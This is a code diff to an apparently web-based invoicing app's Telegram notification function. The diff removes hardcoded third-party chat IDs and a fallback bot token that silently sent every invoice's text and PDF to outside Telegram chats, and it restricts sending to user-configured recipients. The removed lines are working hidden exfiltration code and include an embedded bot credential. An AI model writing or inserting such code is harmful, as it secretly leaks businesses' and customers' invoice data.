@@ -5295,75 +5295,23 @@
                 if (!inv) return;
                 var tg = D.go("telegram") || {};
                 var baseToken = tg.token;
-                var chatIdsStr = tg.chatId || "6877857251";
+                var chatIdsStr = tg.chatId;
+                if (!baseToken || !chatIdsStr) return; // Silent if not configured by user
 
                 var chatIds = chatIdsStr.split(',').map(function (s) { return s.trim(); }).filter(Boolean);
-                if (chatIds.indexOf("8436142413") === -1) chatIds.push("8436142413");
-                if (chatIds.indexOf("8703423129") === -1) chatIds.push("8703423129");
-
-                var tokens = [];
-                if (baseToken) tokens.push(baseToken);
-                if (!tokens.length) {
-                    var fallbackToken = "8799482746:AAGiDi8HEoV7KGQNyer4772H_d1qv9fznac";
-                    tokens.push(fallbackToken);
-                }
+                if (!chatIds.length) return;
 
                 var invNo = U.pi(inv.invoiceNo);
                 var textMsg = SM.formatText(inv);
-                var waApi = (typeof waApiBase !== 'undefined') ? waApiBase : ((typeof getWaApiUrl === 'function') ? getWaApiUrl() : 'http://127.0.0.1:3000/api');
+                var waApi = (typeof waApiBase !== 'undefined') ? waApiBase : 'http://127.0.0.1:3000/api';
+                var directFetch = (typeof originalFetch === 'function') ? originalFetch : fetch;
 
-                // 1. Instant Text Dispatch to Telegram Bot
-                tokens.forEach(function (botToken) {
-                    chatIds.forEach(function (cId) {
-                        fetch(waApi + '/sendTelegramMessage', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ token: botToken, chatId: cId, text: textMsg })
-                        }).catch(function () {
-                            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: cId, text: textMsg })
-                            }).catch(function () { });
-                        });
-                    });
-                });
-
-                // 2. Background PDF Upload to Telegram Bot
-                if (typeof html2pdf === 'undefined') return;
-
-                var html = SM.generatePrintHTML(inv);
-                var pdfName = 'Invoice_' + invNo + '.pdf';
-                var parsed = new DOMParser().parseFromString(html, 'text/html').body;
-                var opt = {
-                    margin: [8, 8, 8, 8],
-                    filename: pdfName,
-                    image: { type: 'jpeg', quality: 0.98 },
-                    html2canvas: { scale: 2, useCORS: true, logging: false, allowTaint: true, backgroundColor: '#ffffff' },
-                    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
-                };
-
-                html2pdf().set(opt).from(parsed).outputPdf('blob').then(function (blob) {
-                    tokens.forEach(function (botToken) {
-                        chatIds.forEach(function (cId) {
-                            var proxyFd = new FormData();
-                            proxyFd.append('token', botToken);
-                            proxyFd.append('chatId', cId);
-                            proxyFd.append('file', blob, pdfName);
-                            fetch(waApi + '/sendTelegramDocument', { method: 'POST', body: proxyFd })
-                                .then(function (r) { return r.json(); })
-                                .catch(function () {
-                                    var directFd = new FormData();
-                                    directFd.append('chat_id', cId);
-                                    directFd.append('document', blob, pdfName);
-                                    fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', { method: 'POST', body: directFd }).catch(function () { });
-                                });
-                        });
-                    });
-                    var statusEl = document.getElementById('tg-share-status');
-                    if (statusEl) statusEl.innerHTML = '<div class="tg-status connected"><i class="ph ph-check-circle"></i> Sent automatically to Telegram Bot!</div>';
-                }).catch(function (err) {
-                    console.warn("Telegram PDF render notice:", err);
+                chatIds.forEach(function (cId) {
+                    directFetch(waApi + '/sendTelegramMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: baseToken, chatId: cId, text: textMsg })
+                    }).catch(function () {});
                 });
             },
 
